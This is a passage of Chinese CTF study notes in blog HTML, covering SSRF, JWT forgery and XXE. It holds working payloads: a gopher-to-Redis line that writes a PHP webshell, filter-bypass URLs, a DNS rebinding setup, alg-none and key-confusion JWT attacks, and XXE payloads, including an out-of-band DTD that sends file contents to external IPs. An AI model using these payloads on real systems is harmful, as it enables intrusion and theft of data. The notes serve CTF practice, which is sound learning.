href="http://127.0.0.1:8000/fgc.php?url=file:///var/www/html/flag.php">http://127.0.0.1:8000/fgc.php?url=file:///var/www/html/flag.php</a><br><a href="http://127.0.0.1:8000/fgc.php?url=http://127.0.0.1/flag.php">http://127.0.0.1:8000/fgc.php?url=http://127.0.0.1/flag.php</a></p><h2 id="1-任意文件读取-前提是知道要读取的文件名"><a href="#1-任意文件读取-前提是知道要读取的文件名" class="headerlink" title="1 任意文件读取 前提是知道要读取的文件名"></a>1 任意文件读取 前提是知道要读取的文件名</h2><h2 id="2-探测内网资源"><a href="#2-探测内网资源" class="headerlink" title="2 探测内网资源"></a>2 探测内网资源</h2><p> 127.0.0.1 mysql服务端监听了127.0.0.1这个地址，也就表示，只能通过127.0.0.1这个IP来访问<br> 0.0.0.0 表示允许任意ip访问<br> 192.168.233.233 只允许特定的IP地址访问<br> 3 使用gopher协议扩展我们的攻击面<br> apache&#x2F;nginx 80<br> tomcat 8080<br> node 3000<br> flask 8080<br> php-fpm 9000<br> mysql 3306<br> ftp 21<br> ssh 22<br> redis 6379<br> key-value  gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;<em>save</em>&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php_<?php eval($_POST[1]);?><br> mysql 3306<br> 用户密码为空<br> php-fpm<br> php-fpm 默认监听9000端口，而且只允许本机127.0.0.1这个地址访问<br> 主要负责对.php文件的代码解释执行<br> 我们可以通过向9000端口发送格式的请求，来让9000端口背后的php-fpm帮我们处理我们提交的php代码<br> 通过向9000端口发送php执行请求<br> 设置php.ini中的运行参数<br> 其中使用 auto_append_file 来指定 php:&#x2F;&#x2F;input 包含恶意代码，然后执行<br> 为了能使用auto_append_file参数，必须有一个存在的php文件来使用这个配置项<br> php原生类进行ssrf<br>$soap &#x3D;new SoapClient($_GET[‘url’]);<br>$soap-&gt;hack();<br>&#x2F;&#x2F;$soap-&gt;__call()<br>url可控，可以发送内网请求<br>ssrf绕过<br>只要不允许它访问本地地址即可，也就是说，过滤的目的是，不让访问127.0.0.1地址<br>1 enclosed alphanumerics 绕过<br>127.0.0.1<br>127.⓿.⓿.1<br>2 使用IP地址转换<br>所有的域名-&gt;IP<br>ip可以使用不同进制来表示<br>127.0.0.1用不同进制可以表示为</p><ul><li><p>2130706433  10进制 <a href="http://127.0.0.1/">http://2130706433</a>  </p></li><li><p>017700000001 8进制 <a href="http://127.0.0.1/">http://017700000001</a> </p></li><li><p>7F000001 16进制   <a href="http://127.0.0.1/">http://0x7F000001</a> </p><h2 id="3-特殊语法绕过"><a href="#3-特殊语法绕过" class="headerlink" title="3 特殊语法绕过"></a>3 特殊语法绕过</h2><p>Windows 下 0 代表的是0.0.0.0<br>而Linux 下 0 代表的是127.0.0.1<br>127.0.0.1 可以省略为 127.1<br>127。0。0。1 可以替代127.0.0.1<br>4 如果对方可以接受302跳转，并且跟进302跳转<br>可以发送http的协议。但是返回的location为其他协议<br><a href="http://xxx.com/302.php?schema=gopher&host=127.0.0.1&port=9000&payload=xxxx">http://xxx.com/302.php?schema=gopher&amp;host=127.0.0.1&amp;port=9000&amp;payload=xxxx</a><br>(1)、服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP<br>(2)、对于获得的IP进行判断，发现为非黑名单IP，则通过验证<br>(3)、服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。<br>(4)、由于已经绕过验证，所以服务器端返回访问内网资源的结果。</p></li></ul><p>compress.zlib:&#x2F;&#x2F;data:@baidu.com&#x2F;baidu.com,phpinfo()<br><code>compress.zlib</code>绕过data协议的检测，<code>@</code>使<code>data:</code>被解释为用户名和密码，<code>baidu.com/baidu.com</code>中只要包含<code>/</code>就会被解释为合法的<code>media-type</code></p><p>1·修改自己域名的a记录，改成127.0.0.1<br>2·这个网站a记录指向127.0.0.1 可以直接利用<br>url&#x3D;<a href="http://sudo.cc/flag.php">http://sudo.cc/flag.php</a></p><ol><li>设置阿里云 DNS 解析<br>首先，您需要一个在阿里云上注册的域名，并且您需要能够管理该域名的 DNS 记录。</li></ol><p>创建域名和设置 DNS 解析<br>登录到 阿里云控制台。<br>在左侧菜单中选择“域名与网站” &gt; “域名”，并选择您的域名。<br>点击“解析”，进入 DNS 解析设置页面。<br>添加 A 记录：<br>主机记录：@<br>记录类型：A<br>解析线路：默认<br>记录值：203.0.113.1（第一次返回的外部 IP）<br>TTL：1分钟<br>注意：阿里云 DNS 不支持将 TTL 设置为 0，但您可以将其设置为最小值，例如 1 分钟。</p><ol start="2"><li>配置可控的 DNS 服务器<br>由于阿里云 DNS 不支持 TTL 为 0 的设置，您需要配置一个您可以完全控制的 DNS 服务器。您可以在阿里云 ECS 实例上运行一个 DNS 服务器（例如 Bind 或 dnsmasq），并手动设置 TTL 为 0。</li></ol><p>使用 dnsmasq 设置 DNS 服务器<br>在阿里云上创建一个 ECS 实例并安装 dnsmasq：</p><p>bash<br>复制代码<br>sudo yum install -y dnsmasq  # 对于 CentOS<br>sudo apt-get install -y dnsmasq  # 对于 Ubuntu<br>编辑 dnsmasq 配置文件 &#x2F;etc&#x2F;dnsmasq.conf，添加如下内容：</p><p>conf<br>复制代码<br>no-resolv<br>server&#x3D;8.8.8.8  # 使用 Google 的公共 DNS 作为上游 DNS 服务器<br>address&#x3D;&#x2F;sudo.cc&#x2F;203.0.113.1  # 初始解析返回外部 IP<br>address&#x3D;&#x2F;sudo.cc&#x2F;127.0.0.1  # 重绑定解析返回内网 IP<br>注意：确保 TTL 设置为 0。dnsmasq 的默认 TTL 是 0，不需要额外配置。</p><p>启动 dnsmasq 服务：</p><p>bash<br>复制代码<br>sudo systemctl restart dnsmasq<br>sudo systemctl enable dnsmasq<br>更新您在阿里云上的域名解析，指向您配置的 ECS 实例的 IP 地址。</p><ol start="3"><li>执行 DNS Rebinding 攻击<br>在攻击者机器上启动 netcat</li></ol><p> 监听：</p><p>bash<br>复制代码<br>nc -lvnp 4444<br>发送 POST 请求到目标服务器：</p><p>bash<br>复制代码<br>curl -X POST -d “url&#x3D;<a href="http://sudo.cc/flag.php">http://sudo.cc/flag.php</a>“ http:&#x2F;&#x2F;目标服务器地址&#x2F;script.php<br>验证和调试<br>验证 DNS 解析：<br>确保在目标服务器上进行 DNS 解析时，能够返回正确的 IP 地址：</p><p>bash<br>复制代码<br>nslookup sudo.cc<br>检查防火墙和安全组：<br>确保您的阿里云 ECS 实例的安全组规则允许外部访问。</p><p>监控 DNS 解析：<br>使用 tcpdump 或其他网络监控工具，确保 DNS 请求和响应符合预期。</p><p>注意事项<br>合法性：确保您进行的所有操作都是在合法授权的范围内。未经授权的攻击是非法的。<br>测试环境：最好在隔离的测试环境中进行测试，以避免对生产环境造成影响。<br>防护措施：了解并学习这些攻击技术后，建议采取相应的防护措施，防止在实际应用中被利用。</p><p>5 利用短网址绕过<br>baidu.com  不允许出现baidu<br>或者限制了url长度，我们可以切换为短网址，来绕过长度的限制<br><a href="http://rurl.vip/eW7AU">http://rurl.vip/eW7AU</a></p><p>首先准备监听<br>url&#x3D;<a href="http://ctf.@127.0.0.1/flag.php?show">http://ctf.@127.0.0.1/flag.php?show</a><br>url&#x3D;<a href="http://ctf.@127.0.0.1/flag.php#show">http://ctf.@127.0.0.1/flag.php#show</a></p><h1 id="本地才能看到flag，这就需要ssrf了"><a href="#本地才能看到flag，这就需要ssrf了" class="headerlink" title="本地才能看到flag，这就需要ssrf了"></a>本地才能看到flag，这就需要ssrf了</h1><h1 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h1><p>jwt是一个轻量级的认证规范 对数据进行签名用的</p><p>防止数据被篡改<br>1 对数据进行加密   内容对用户敏感，不需要对外<br>2 对数据进行签名   内容不敏感，但是确保不被篡改</p><p>JWT是对数据进行签名，防止数据篡改，而不是防止数据被读取<br>JSON Web Token JWT<br>?username&#x3D;admin&amp;score&#x3D;100  别人传递过程中，会对积分进行篡改<br>?username&#x3D;admin&amp;score&#x3D;100&amp;token&#x3D;c17961f5f372f8cf039113909d715943<br>? md5(score&#x3D;100&amp;username&#x3D;admin)&#x3D;c17961f5f372f8cf039113909d715943<br>?score&#x3D;100&amp;username&#x3D;admin&amp;token&#x3D;c17961ff372f8cf039113909d715943<br>篡改数据的同时，破解了算法，篡改了签名<br>加盐机制，salt<br>md5(score&#x3D;100&amp;username&#x3D;admin_ctfshow)&#x3D;20f3fa445b286df3f1a518fcbcd8bbe2</p><p>盐值有可能被爆破，也有可能被泄露<br>增加更高的密码算法，不再简单的md5，盐值也大幅度提高长度，达到几百上千位 来保证我们的数据不被篡改  或者即使篡改了我们能发现<br>由 Header、Payload、Signature三部分构成，用点分隔，数据采用Base64URL进行编码<br>Header是JWT的第一个部分，是一个 JSON 对象，主要声明了JWT的签名算法，如“HS256”、“RS256”等，以及其他可选参数，如“kid”等。<br>Header</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;alg&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;HS256&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;typ&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;jwt&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>Payload是JWT的第二个部分，这也是一个 JSON 对象，主要承载了各种声明并传递明文数据，一般用于存储用户的信息，如 id、用户名、角色、令牌生成时间和其他自定义声明<br>Payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;user&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Admin&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>Signature<br>    Signature 是对 Header 和 Payload 进行签名，具体是用什么加密方式写在 Header的alg中。同时拥有该部分的JWT被称为JWS，也就是签了名的JWT。<br>    Signature的功能是保护token完整性。<br>生成方法为将header和payload两个部分联结起来，然后通过header部分指定的算法，计算出签名。抽象成公式就是：signature &#x3D; HMAC-SHA256(base64urlEncode(header) + ‘.’ + base64urlEncode(payload), secret_key)<br>值得注意的是，编码header和payload时使用的编码方式为base64urlencode，base64url编码是base64的修改版，为了方便在网络中传输使用了不同的编码表，它不会在末尾填充”&#x3D;”号，并将标准Base64中的”+”和”&#x2F;“分别改成了”-“和”_”。</p><p>JWT生成-在线网址&amp;工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 flask_session_cookie_manager3.py encode -s <span class="hljs-string">&#x27;secret_key&#x27;</span> -t <span class="hljs-string">&#x27;&#123;&quot;admin&quot;:True,&quot;username&quot;:&quot;admin&quot;&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>1 当不校验算法时，我们可以替换算法，甚至可以使用空的算法，来达到数据篡改目的</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;alg&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;None&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;typ&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;jwt&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;user&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Admin&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;alg&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;None&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;typ&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;JWT&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;iss&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;iat&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1673703091</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;exp&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1673710291</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;nbf&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1673703091</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;sub&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;jti&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;21a3d6eec9efbc030983fbc3650c0f03&quot;</span><span class="hljs-punctuation">&#125;</span><br><br>ewogICAgImFsZyIgOiAiTm9uZSIsCiAgICAidHlwIiA6ICJqd3QiCn0=.ewogICAgInVzZXIiIDogImFkbWluIgp9<br></code></pre></td></tr></table></figure><p>JWT 爆破工具地址<br><a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker build . -t jwtcrack<br>docker run -it --<span class="hljs-built_in">rm</span>  jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE<br></code></pre></td></tr></table></figure><h3 id="密钥混淆攻击"><a href="#密钥混淆攻击" class="headerlink" title="密钥混淆攻击"></a>密钥混淆攻击</h3><pre><code class="hljs">JWT最常用的两种算法是HMAC和RSA。HMAC用同一个密钥对token进行签名和认证。而RSA需要两个密钥，先用私钥加密生成JWT，然后使用其对应的公钥来解密验证。那么，后端代码会使用公钥作为秘密密钥，然后使用HS256算法验证签名。由于公钥有时可以被攻击者获取到，所以攻击者可以修改header中算法为HS256，然后使用RSA公钥对数据进行签名。 利用方式：jwt_tool(https://github.com/ticarpi/jwt_tool) 用法：python3 jwt_tool.py token_here -pk pubkey -T -S hs256</code></pre><p>密钥爆破&#x2F;泄露<br>    HMAC签名密钥（例如HS256 &#x2F; HS384 &#x2F; HS512）使用对称加密，这意味着对令牌进行签名的密钥也用于对其进行验证。由于签名验证是一个自包含的过程，因此可以测试令牌本身的有效密钥，而不必将其发送回应用程序进行验证。<br>    因此，jwtcrack破解是JWT破解工具，可以通过穷举的方式暴力破解密钥。<br>    如果可以破解HMAC密钥，则可以伪造令牌中的任何内容，这个漏洞将会给系统带来非常严重的后果，所以在加密时不要使用弱密钥进行加密。<br>    jwtcrack(<a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a>)<br>    用法：.&#x2F;jwtcrack token_here</p><p>node安装jwt命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install jsonwebtoken<br></code></pre></td></tr></table></figure><h3 id="私钥泄露"><a href="#私钥泄露" class="headerlink" title="私钥泄露"></a>私钥泄露</h3><p>可以根据私钥生成任意的jwt字符串</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>);<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><br><span class="hljs-keyword">var</span> privateKey = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;private.key&#x27;</span>);<br><br><span class="hljs-keyword">var</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123; <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;RS256&#x27;</span> &#125;);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(token)<br></code></pre></td></tr></table></figure><p>验签</p><h3 id="公钥泄露"><a href="#公钥泄露" class="headerlink" title="公钥泄露"></a>公钥泄露</h3><p>可以根据公钥，修改算法从非对称算法 到 对称密钥算法  </p><p>双方都使用公钥验签，顺利篡改数据</p><p>当公钥可以拿到时，如果使用对称密码，则对面使用相同的公钥进行解密</p><p>实现验签通过</p><h3 id="总结加密方式"><a href="#总结加密方式" class="headerlink" title="总结加密方式"></a>总结加密方式</h3><p>1 非对称加密算法  私钥  公钥   只要两个时匹配 一个私钥加密的文件，用公钥都能解开(验签)</p><p>2 对称加密算法   暗号  口令  公钥 </p><h3 id="总结jwt攻击"><a href="#总结jwt攻击" class="headerlink" title="总结jwt攻击"></a>总结jwt攻击</h3><p>1 空密码算法绕过 不验证算法的前提下</p><p>2 弱密码绕过   猜测弱密码</p><p>3 密码爆破   安装docker 执行jwtcracker</p><p>4 私钥泄露  直接利用私钥生成正确jwt字符串 过验签</p><p>5 公钥泄露  不验证算法前提下，修改算法为对称加密，通过公钥重新生成对称签名的字符串 实现验签通过</p><p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p><h1 id="XXE的利用"><a href="#XXE的利用" class="headerlink" title="XXE的利用"></a>XXE的利用</h1><p>受到影响的类和函数<br><code>SimpleXMLElement</code>、&#96;DOM</p><p>Document<code>、</code>simplexml_load_string&#96;<br>(libxml&lt;2.9.0, PHP 5, PHP 7)<br>libxml2.9.0以后，默认不解析外部实体，导致XXE漏洞逐渐消亡。为了演示PHP环境下的XXE漏洞<br>XML Entity 实体注入<br>当程序处理xml文件时，没有禁止对外部实体的处理，容易造成xxe漏洞<br>危害<br>主流是任意文件读取<br>Content-Type: text&#x2F;xml</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<span class="hljs-comment">//默认情况下，libxml_disable_entity_loader 是启用的，它禁用外部实体的加载。这里，它被设置为 false，意味着允许外部实体的加载。这可能带来安全风险，因为它可能允许 XXE (XML External Entity) 攻击</span><br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<span class="hljs-comment">//LIBXML_NOENT 会将实体替换为它们的值，而 LIBXML_DTDLOAD 会加载外部 DTD。</span><br>    <span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);<br>    <span class="hljs-variable">$ctfshow</span> = <span class="hljs-variable">$creds</span>-&gt;ctfshow; <span class="hljs-comment">//从 SimpleXMLElement 对象中提取名为 &quot;ctfshow&quot; 的元素。</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$ctfshow</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p>XML 文件<br>一般表示带有结构的数据<br>祖父  3个叔父  8个堂弟堂妹   </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">祖父</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">叔父1</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">堂兄1</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">叔父1</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">叔父2</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">堂兄2</span>&gt;</span>    <br>    <span class="hljs-tag">&lt;/<span class="hljs-name">叔父2</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">叔父3</span>&gt;</span><br><br>     <span class="hljs-tag">&lt;<span class="hljs-name">堂兄3</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">叔父4</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">祖父</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE&gt;</span> 声明定义了整个文档的类型，<span class="hljs-meta">&lt;!ENTITY&gt;</span> 声明定义了一个实体。<br>xml格式<br>1 有回显时文件读取方法<br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hacker</span>[</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">hacker</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span> <br><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ctfshow</span>&gt;</span><br>        <span class="hljs-symbol">&amp;hacker;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">ctfshow</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br><br>php://filter/read=convert.base64-encode/resource=/flag<br></code></pre></td></tr></table></figure><p>2 无回显时文件读取方法</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hacker</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">myurl</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://47.236.120.83/test.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">    %myurl;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>1<br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>test.dtd内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY % dtd &quot;&lt;!ENTITY &amp;#x25; vps SYSTEM &#x27;http://43.154.107.226:3389/%file;&#x27;&gt; &quot;&gt;<br>%dtd;<br>%vps;<br></code></pre></td></tr></table></figure><h3 id="报错xxe"><a href="#报错xxe" class="headerlink" title="报错xxe"></a>报错xxe</h3><ul><li>libxml&lt;&#x3D;2.8(2.9以后默认不使用外部实体)</li><li>开启了报错</li><li>无回显</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">message</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % a <span class="hljs-string">&#x27;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY &amp;#x25; b &quot;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">&quot;&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">&#x27;</span>&gt;</span></span><br><span class="hljs-meta">%a;</span><br><span class="hljs-meta">%b;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>asfddasfd<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br></code></pre></td></tr></table></figure><p>或</p><figure class="highlight xml"><table><tr><td 